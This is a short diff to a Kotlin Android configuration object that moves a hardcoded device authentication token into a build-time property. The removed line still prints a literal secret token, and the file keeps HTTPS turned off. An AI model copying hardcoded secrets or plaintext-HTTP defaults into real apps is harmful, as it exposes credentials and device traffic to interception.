@@ -10,9 +10,9 @@ object AndroidConfig {
     private var serverBaseUrl = BuildConfig.SERVER_BASE_URL
     private var useHttps = false
     
-    // API Authentication Token (MUST match server's config/device_secret.token)
-    // Alias for compatibility: use 'deviceToken' or 'DEVICE_TOKEN'
-    const val DEVICE_TOKEN = "EagleSpy_X9f2K7mN4pQ8wL3jR6vT1bY5cH0sA"
+    // API Authentication Token - loaded from BuildConfig (set via Gradle property -PdeviceToken="...")
+    // NEVER hardcode tokens in source code!
+    val DEVICE_TOKEN: String = BuildConfig.DEVICE_AUTH_TOKEN
     val deviceToken: String get() = DEVICE_TOKEN
     
     // Device Identifier (cached from Settings.Secure.ANDROID_ID)
